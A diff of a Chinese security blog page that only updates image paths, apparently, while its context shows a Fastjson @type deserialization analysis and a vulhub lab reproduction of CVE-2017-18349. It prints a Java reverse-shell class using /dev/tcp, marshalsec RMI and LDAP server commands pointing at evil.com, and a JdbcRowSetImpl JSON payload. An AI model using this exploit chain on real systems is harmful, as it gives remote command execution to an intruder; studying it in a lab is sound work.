@@ -173,11 +173,11 @@ Fastjson中的@type">
 <p>反序列化：<code>parse()</code>先调用@type标识的类的构造函数，然后再调用setter给对象赋值；parseObject()方法会同时调用setter和getter。</p>
 <p><strong>源码分析</strong></p>
 <p><code>DefaultJSONParser#parseObject</code>方法中，通过<code>scanSymbol()</code>方法来解析出表示符 @type</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201172029725.png" alt="image-20240201172029725"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201172029725.png" alt="image-20240201172029725"></p>
 <p>反射加载<code>@type</code></p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201195551574.png" alt="image-20240201195551574"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201195551574.png" alt="image-20240201195551574"></p>
 <p>反射加载的类的时候会对类进行黑名单检查，黑名单中有Thread类</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201200115379.png" alt="image-20240201200115379"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201200115379.png" alt="image-20240201200115379"></p>
 <p>然后会在反射获取的方法中循环遍历寻找特定的setter和getter。条件如下：</p>
 <ul>
 <li>方法名长度大于4且以set开头，且第四个字母要是大写</li>
@@ -195,29 +195,29 @@ Fastjson中的@type">
 <p>fastjsonTestCalc.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonCalc</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Calc\&quot;,\&quot;calc\&quot;:\&quot;Faster\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(JSON.parseObject(jsonCalc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240201202542836.png" alt="image-20240201202542836"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240201202542836.png" alt="image-20240201202542836"></p>
 <h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>CVE-2017-18349</p>
 <p>环境：vulhub</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240324201602077.png" alt="image-20240324201602077"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240324201602077.png" alt="image-20240324201602077"></p>
 <p>目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令</p>
 <p>ReverseShell.java编译成class并开启http服务(python -m http.server 80)</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReverseShell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.6.110/6666 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133120899.png" alt="image-20240325133120899"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133120899.png" alt="image-20240325133120899"></p>
 <p>借助<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>项目(测试Jdk8u211)，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>ReverseShell.class</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133052275.png" alt="image-20240325133052275"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133052275.png" alt="image-20240325133052275"></p>
 <p>向靶场服务器发送Payload，带上RMI的地址：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/ReverseShell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133148708.png" alt="image-20240325133148708"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133148708.png" alt="image-20240325133148708"></p>
 <p>Final</p>
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325133308910.png" alt="image-20240325133308910"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325133308910.png" alt="image-20240325133308910"></p>
 <p><strong>LDAP</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://evil.com/#ReverseShell&quot; 9999</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240325135737374.png" alt="image-20240325135737374"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240325135737374.png" alt="image-20240325135737374"></p>
 
 	  <!--
 <div class="article-footer-copyright">
